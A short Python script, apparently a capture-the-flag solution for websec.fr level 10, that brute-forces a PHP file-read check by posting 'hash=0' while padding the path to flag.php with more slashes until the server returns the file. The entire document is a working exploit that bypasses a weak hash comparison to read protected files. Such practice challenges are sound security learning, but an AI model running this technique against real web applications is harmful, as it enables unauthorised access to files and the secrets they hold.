#!/usr/bin/python
# coding: utf-8

from requests import *
import sys

url = 'http://websec.fr/level10/index.php'
f = './flag.php'

i = 0

while True:

    i += 1

    data = {
        'f': f,
        'hash': 0,
    }

    r = post(url, data=data)
    if r.text.find('Permission denied!') > -1:
        print '[x] reading flag failed.. ({0} tryed..)'.format(i)
        f = '.' + '/' * i + 'flag.php'
    else:
        print '[*] successful payload : {0}'.format(f)
        print r.text
        sys.exit(0)

# ./exploit.py > result
